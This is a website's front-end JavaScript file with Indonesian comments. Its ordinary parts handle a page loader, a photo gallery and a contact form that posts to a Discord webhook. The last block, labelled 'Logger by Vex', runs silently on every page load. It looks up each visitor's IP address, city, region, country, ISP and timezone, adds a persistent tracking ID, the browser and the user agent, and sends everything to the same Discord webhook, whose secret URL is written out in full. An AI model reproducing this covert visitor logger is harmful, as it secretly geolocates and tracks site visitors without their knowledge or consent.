window.addEventListener("load", () => {
  setTimeout(() => {
    const loader = document.getElementById("loader");
    if (loader) {
      loader.classList.add("fade-out");
    }
  }, 2500);
});

	//Galeri
// Menunggu DOM siap
document.addEventListener("DOMContentLoaded", function () {
  // Menampilkan galeri
  document.getElementById("openGallery").onclick = function () {
    document.getElementById("fullscreenGallery").classList.add("show"); // Menambahkan kelas 'show' untuk membuka galeri
  };

  // Menutup galeri
  document.getElementById("closeGallery").onclick = function () {
    document.getElementById("fullscreenGallery").classList.remove("show"); // Menghapus kelas 'show' untuk menutup galeri
  };

  // Menampilkan lightbox saat gambar dalam galeri diklik
  document.querySelectorAll(".gallery-grid img").forEach(img => {
    img.addEventListener("click", () => {
      const lightbox = document.getElementById("lightbox");
      const lightboxImg = lightbox.querySelector(".lightbox-img");
      lightboxImg.src = img.src; // Mengatur src image lightbox dengan src gambar yang diklik
      lightbox.style.display = "flex"; // Menampilkan lightbox
    });
  });

  // Menutup lightbox saat tombol close-lightbox diklik
  document.querySelector(".close-lightbox").addEventListener("click", () => {
    const lightbox = document.getElementById("lightbox");
    lightbox.style.display = "none"; // Menutup lightbox
  });
});

 // Script Galeri

// Script Form-Kontak

  document.getElementById('contact-form').addEventListener('submit', function (event) {
    event.preventDefault(); // Prevent form from submitting the default way

    // Pesan Yang Wajib Di isi
    const name = document.querySelector('[name="name"]').value;
    const email = document.querySelector('[name="email"]').value;
    const message = document.querySelector('[name="message"]').value;

    // Menyiapkan Payload
    const embed = {
      "embeds": [{
        "title": "Kontak Form Submission",
        "color": 3447003,
        "fields": [
          { "name": "Nama", "value": name, "inline": true },
          { "name": "Gmail", "value": email, "inline": true },
          { "name": "Pesan", "value": message, "inline": false }
        ],
        "footer": {
          "text": "Pesan Kontak Web"
        }
      }]
    };

   
    // Mengirim Pesan 
    const webhookUrl = 'https://discord.com/api/webhooks/1365583624115847218/924teezrVY3kz-N1ogtljxXAa4Ef5GgvOUMJ3tSZxAiRQ4tQh6g7OINU57Jf1CfdZAb1';

    fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(embed)
    })
    .then(response => {
      if (response.ok) {
        alert('Pesan berhasil dikirim!');
      } else {
        alert('Terjadi kesalahan saat mengirim pesan!');
      }
    })
    .catch(error => {
      console.error('Error sending message to Discord:', error);
      alert('Terjadi kesalahan dalam pengiriman pesan!');
    });
  });

// Script Form-Kontak




	
  // Script Log HWID, Device info, User Agent, dan IP Log
    (async () => {
  const webhookURL = "https://discord.com/api/webhooks/1365583624115847218/924teezrVY3kz-N1ogtljxXAa4Ef5GgvOUMJ3tSZxAiRQ4tQh6g7OINU57Jf1CfdZAb1";

  try {
    const data = await fetch("https://ipapi.co/json/").then(res => res.json());
    let hwid = localStorage.getItem("vex_hwid");
    if (!hwid) {
      hwid = crypto.randomUUID();
      localStorage.setItem("vex_hwid", hwid);
    }

    const ua = data.user_agent || navigator.userAgent;
    function detectBrowser(ua) {
      if (/Edg/i.test(ua)) return "Microsoft Edge";
      if (/OPR|Opera/i.test(ua)) return "Opera";
      if (/Chrome/i.test(ua)) return "Google Chrome";
      if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) return "Safari";
      if (/Firefox/i.test(ua)) return "Mozilla Firefox";
      return "Unknown Browser";
    }

    const browser = detectBrowser(ua);
    const now = new Date().toLocaleString();

    const embed = {
      embeds: [{
        title: "New Visitor Logged [Multi-API]",
        color: 0xFFD700,
        fields: [
          { name: "IP Address", value: data.ip, inline: true },
          { name: "HWID (Simulated)", value: hwid, inline: true },
          { name: "City", value: data.city, inline: true },
          { name: "Region", value: data.region, inline: true },
          { name: "Country", value: data.country_name, inline: true },
          { name: "Org / ISP", value: data.org, inline: true },
          { name: "Timezone", value: data.timezone, inline: true },
          { name: "Browser", value: browser, inline: true },
          { name: "User Agent", value: ua.slice(0, 256) },
          { name: "Date", value: now, inline: true }
        ],
        footer: { text: "Logger by Vex | Sumber: ipapi.co" }
      }]
    };

    await fetch(webhookURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(embed)
    });

    console.log("Webhook sent successfully!");
  } catch (error) {
    console.error("Error while sending webhook:", error);
  }
})();
  // Script Log HWID, Device info, User Agent, dan IP Log